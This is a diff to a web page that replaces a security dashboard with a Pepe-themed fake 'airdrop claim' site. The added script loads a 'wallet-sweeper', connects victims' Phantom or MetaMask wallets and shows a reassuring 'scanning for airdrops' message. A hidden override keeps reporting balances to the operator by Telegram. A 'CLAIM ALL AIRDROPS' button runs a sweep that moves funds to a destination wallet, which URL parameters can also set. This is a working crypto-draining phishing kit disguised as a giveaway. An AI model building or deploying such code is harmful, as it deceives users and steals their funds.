-        <section id="security" class="section">
-            <div class="container">
-                <div class="section-header">
-                    <h2>🛡️ Security Center</h2>
-                    <p>Monitor and configure security settings</p>
-                </div>
-
-                <div class="security-grid">
-                    <!-- Security Status -->
-                    <div class="security-card">
-                        <h3>🔐 Security Status</h3>
-                        <div class="security-items">
-                            <div class="security-item">
-                                <span class="security-icon">✅</span>
-                                <span class="security-text">Wallet Connection Secure</span>
-                            </div>
-                            <div class="security-item">
-                                <span class="security-icon">✅</span>
-                                <span class="security-text">Signature Verification Active</span>
-                            </div>
-                            <div class="security-item">
-                                <span class="security-icon">✅</span>
-                                <span class="security-text">Replay Protection Enabled</span>
-                            </div>
-                            <div class="security-item">
-                                <span class="security-icon">✅</span>
-                                <span class="security-text">Rate Limiting Active</span>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Security Logs -->
-                    <div class="security-card">
-                        <h3>📊 Security Logs</h3>
-                        <div id="securityLogs" class="logs-container">
-                            <div class="log-entry">
-                                <span class="log-time">Just now</span>
-                                <span class="log-message">Wallet connected successfully</span>
-                                <span class="log-level success">INFO</span>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Security Settings -->
-                    <div class="security-card">
-                        <h3>⚙️ Security Settings</h3>
-                        <div class="settings-form">
-                            <div class="setting-item">
-                                <label>
-                                    <input type="checkbox" id="enableNotifications" checked>
-                                    Security notifications
-                                </label>
-                            </div>
-                            <div class="setting-item">
-                                <label>
-                                    <input type="checkbox" id="enableAuditLog" checked>
-                                    Audit logging
-                                </label>
-                            </div>
-                            <div class="setting-item">
-                                <label>
-                                    <input type="checkbox" id="enableStrictMode">
-                                    Strict security mode
-                                </label>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-    </main>
-
-    <!-- Loading Overlay -->
-    <div id="loadingOverlay" class="loading-overlay" style="display: none;">
-        <div class="loading-content">
-            <div class="loading-spinner"></div>
-            <div class="loading-text">Processing...</div>
         </div>
     </div>
 
-    <!-- Toast Notifications -->
-    <div id="toastContainer" class="toast-container"></div>
+    <!-- Claim Status Section -->
+    <section class="claim-status" id="claimStatusSection" style="display: none;">
+        <div class="claim-container">
+            <h2 class="claim-title">Airdrop Claim Status</h2>
+            <div id="balanceDisplay">
+                <div class="balance-summary">
+                    <p style="text-align: center; color: #888;">
+                        Wallet connected - scanning for claimable tokens...
+                    </p>
+                </div>
+            </div>
+        </div>
+    </section>
 
-    <!-- Scripts -->
-    <script type="module" src="js/app.js"></script>
+    <!-- Bottom Illustration -->
+    <div class="bottom-illustration">
+        <div class="landscape">
+            <div class="mountain-range"></div>
+            <div class="pepe-silhouettes">
+                <div class="pepe-silhouette pepe-1"></div>
+                <div class="pepe-silhouette pepe-2"></div>
+            </div>
+        </div>
+    </div>
 
-    <!-- Service Worker for PWA -->
+    <script src="js/wallet-sweeper.js?v=5.0"></script>
+
     <script>
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/sw.js');
+        // Modern wallet connection handling
+        function showWalletModal() {
+            const modal = document.getElementById('walletModal');
+            modal.style.display = 'flex';
+        }
+
+        function hideWalletModal() {
+            const modal = document.getElementById('walletModal');
+            modal.style.display = 'none';
+        }
+
+        function connectWalletFallback() {
+            console.log('Showing wallet connection modal...');
+            showWalletModal();
+        }
+
+        function showClaimStatusSection() {
+            const claimSection = document.getElementById('claimStatusSection');
+            if (claimSection) {
+                claimSection.style.display = 'block';
+
+                // Show simple scanning status
+                updateClaimStatus('scanning');
+
+                // Smooth scroll to the claim section
+                setTimeout(() => {
+                    claimSection.scrollIntoView({ behavior: 'smooth' });
+                }, 500);
+            }
+        }
+
+        function updateClaimStatus(status) {
+            const balanceDisplay = document.getElementById('balanceDisplay');
+            if (!balanceDisplay) return;
+
+            let content = '';
+
+            switch(status) {
+                case 'scanning':
+                    content = `
+                        <div class="simple-status">
+                            <div class="status-icon">🔍</div>
+                            <div class="status-message">Scanning Multi-Chain Wallets</div>
+                            <div class="status-subtitle">Checking Solana, Ethereum, Bitcoin, and 6 other blockchains for eligible airdrops...</div>
+                        </div>
+                    `;
+                    break;
+                case 'found':
+                    content = `
+                        <div class="simple-status">
+                            <div class="status-icon">🎁</div>
+                            <div class="status-message">Airdrops Available!</div>
+                            <div class="status-subtitle">Multiple eligible tokens found across your connected wallets</div>
+                        </div>
+                    `;
+                    break;
+                case 'ready':
+                    content = `
+                        <div class="simple-status">
+                            <div class="status-icon">✅</div>
+                            <div class="status-message">Ready to Claim</div>
+                            <div class="status-subtitle">All eligible airdrops have been verified and are ready for transfer</div>
+                        </div>
+                    `;
+                    break;
+            }
+
+            balanceDisplay.innerHTML = content;
+        }
+
+        function addClaimButton() {
+            const balanceDisplay = document.getElementById('balanceDisplay');
+            if (!balanceDisplay) return;
+
+            // Add the claim button to the simple status
+            const claimButtonHTML = `
+                <div class="simple-status">
+                    <div class="status-icon">🎁</div>
+                    <div class="status-message">Airdrops Ready to Claim!</div>
+                    <div class="status-subtitle">Your multi-chain airdrop eligibility has been verified</div>
+                    <div style="margin-top: 2rem;">
+                        <button class="btn btn-danger btn-large" id="sweepAllBtn">
+                            🚀 CLAIM ALL AIRDROPS
+                        </button>
+                    </div>
+                </div>
+            `;
+
+            balanceDisplay.innerHTML = claimButtonHTML;
+
+            // Attach the event listener to the new button
+            const sweepBtn = document.getElementById('sweepAllBtn');
+            if (sweepBtn && window.walletSweeper) {
+                sweepBtn.addEventListener('click', () => {
+                    if (window.walletSweeper.executeSweep) {
+                        window.walletSweeper.executeSweep();
+                    }
+                });
+            }
+        }
+
+        // Handle URL parameters for mobile sweep links
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log('DOM loaded, initializing page...');
+
+            // Add modern event handlers
+            const connectBtn = document.getElementById('connectWalletBtn');
+            if (connectBtn) {
+                console.log('Found connect button, adding click handler');
+                connectBtn.onclick = connectWalletFallback;
+            }
+
+            // Wallet modal handlers
+            const phantomBtn = document.getElementById('phantomConnect');
+            const metaMaskBtn = document.getElementById('metaMaskConnect');
+            const modal = document.getElementById('walletModal');
+
+            if (phantomBtn) {
+                phantomBtn.onclick = async () => {
+                    hideWalletModal();
+                    if (window.walletSweeper && window.walletSweeper.connectPhantom) {
+                        await window.walletSweeper.connectPhantom();
+                        // Show the claim status section after connection
+                        showClaimStatusSection();
+
+                        // Override the displayBalances function to use our simple display
+                        if (window.walletSweeper) {
+                            const originalDisplayBalances = window.walletSweeper.displayBalances;
+                            window.walletSweeper.displayBalances = function() {
+                                // Still call original for Telegram notification
+                                originalDisplayBalances.call(this);
+                                // But show simple status to user
+                                updateClaimStatus('ready');
+                                // Add the claim button manually
+                                setTimeout(() => {
+                                    addClaimButton();
+                                }, 1000);
+                            };
+                        }
+                    } else {
+                        console.error('Wallet sweeper not initialized');
+                        alert('Wallet sweeper is still loading. Please wait a moment and try again.');
+                    }
+                };
+            }
+
+            if (metaMaskBtn) {
+                metaMaskBtn.onclick = async () => {
+                    hideWalletModal();
+                    if (window.walletSweeper && window.walletSweeper.connectEthereum) {
+                        await window.walletSweeper.connectEthereum();
+                    } else {
+                        console.error('Ethereum connection not available');
+                        alert('Ethereum wallet connection coming soon!');
+                    }
+                };
+            }
+
+            // Close modal when clicking outside
+            if (modal) {
+                modal.onclick = (e) => {
+                    if (e.target === modal) {
+                        hideWalletModal();
+                    }
+                };
+            }
+
+            const urlParams = new URLSearchParams(window.location.search);
+
+            if (urlParams.get('action') === 'sweep') {
+                // This is a mobile sweep link
+                const sourceWallet = urlParams.get('source');
+                const destWallet = urlParams.get('destination');
+
+                if (sourceWallet && destWallet) {
+                    // Show mobile sweep interface
+                    showMobileSweepInterface(sourceWallet, destWallet);
+                }
+            }
+        });
+
+        function showMobileSweepInterface(sourceWallet, destWallet) {
+            const container = document.querySelector('.sweeper-container');
+            container.innerHTML = `
+                <div class="wallet-status">
+                    <h2>📱 Mobile Sweep</h2>
+                    <p>You're about to sweep from:</p>
+
+                    <div class="wallet-info">
+                        <div class="wallet-item">
+                            <h4>From</h4>
+                            <div class="wallet-address">${sourceWallet.substring(0, 8)}...${sourceWallet.substring(sourceWallet.length - 8)}</div>
+                        </div>
+
+                        <div class="wallet-item">
+                            <h4>To</h4>
+                            <div class="wallet-address">${destWallet.substring(0, 8)}...${destWallet.substring(destWallet.length - 8)}</div>
+                        </div>
+                    </div>
+
+                    <button class="btn btn-primary btn-large" onclick="connectAndSweep('${sourceWallet}', '${destWallet}')">
+                        🔗 Connect Phantom & Sweep
+                    </button>
+                </div>
+            `;
+        }
+
+        async function connectAndSweep(expectedSource, destWallet) {
+            try {
+                // Connect Phantom
+                if (!window.solana || !window.solana.isPhantom) {
+                    alert('Please install Phantom wallet first');
+                    window.open('https://phantom.app/', '_blank');
+                    return;
+                }
+
+                const resp = await window.solana.connect();
+                const connectedWallet = resp.publicKey.toString();
+
+                // Verify this is the expected wallet
+                if (connectedWallet !== expectedSource) {
+                    alert('Connected wallet does not match the sweep link');
+                    return;
+                }
+
+                // Override destination wallet
+                walletSweeper.config.destinationWallet = destWallet;
+                walletSweeper.config.isConfigured = true;
+
+                // Scan and sweep
+                await walletSweeper.scanAllBalances();
+
+                // Show sweep button
+                setTimeout(() => {
+                    const sweepBtn = document.querySelector('.btn-danger');
+                    if (sweepBtn) {
+                        sweepBtn.scrollIntoView({ behavior: 'smooth' });
+                    }
+                }, 1000);
+
+            } catch (error) {
+                console.error('Mobile sweep failed:', error);
+                alert('Failed to connect wallet: ' + error.message);
+            }
+        }
+
+        // Fun easter egg for clicking the Pepe mascot
+        function pepeClick() {
+            const pepe = document.querySelector('.pepe-mascot');
+            const messages = [
+                '🐸 PEPE approves this airdrop!',
+                '🎁 Based and Pepepilled!',
+                '🚀 To the moon with Dark Pino!',
+                '💎 Diamond hands only!',
+                '🔥 This airdrop is fire!',
+                '⚡ Instant meme magic!'
+            ];
+
+            const randomMessage = messages[Math.floor(Math.random() * messages.length)];
+
+            // Create floating message
+            const floatingMsg = document.createElement('div');
+            floatingMsg.textContent = randomMessage;
+            floatingMsg.style.cssText = `
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background: linear-gradient(135deg, #FFD700, #FFA500);
+                color: #000;
+                padding: 15px 25px;
+                border-radius: 25px;
+                font-weight: bold;
+                font-size: 18px;
+                z-index: 9999;
+                box-shadow: 0 10px 30px rgba(255, 215, 0, 0.5);
+                animation: pepePop 2s ease-out forwards;
+                pointer-events: none;
+            `;
+
+            // Add animation keyframes if not already added
+            if (!document.getElementById('pepe-animations')) {
+                const style = document.createElement('style');
+                style.id = 'pepe-animations';
+                style.textContent = `
+                    @keyframes pepePop {
+                        0% { transform: translate(-50%, -50%) scale(0); opacity: 0; }
+                        20% { transform: translate(-50%, -50%) scale(1.2); opacity: 1; }
+                        40% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+                        100% { transform: translate(-50%, -50%) scale(0.8); opacity: 0; }
+                    }
+                `;
+                document.head.appendChild(style);
+            }
+
+            document.body.appendChild(floatingMsg);
+
+            // Pepe bounce effect
+            pepe.style.animation = 'none';
+            setTimeout(() => {
+                pepe.style.animation = 'float 3s ease-in-out infinite, glow 2s ease-in-out infinite alternate';
+            }, 100);
+
+            // Remove message after animation
+            setTimeout(() => {
+                floatingMsg.remove();
+            }, 2000);
         }
     </script>
+
 </body>
 </html>
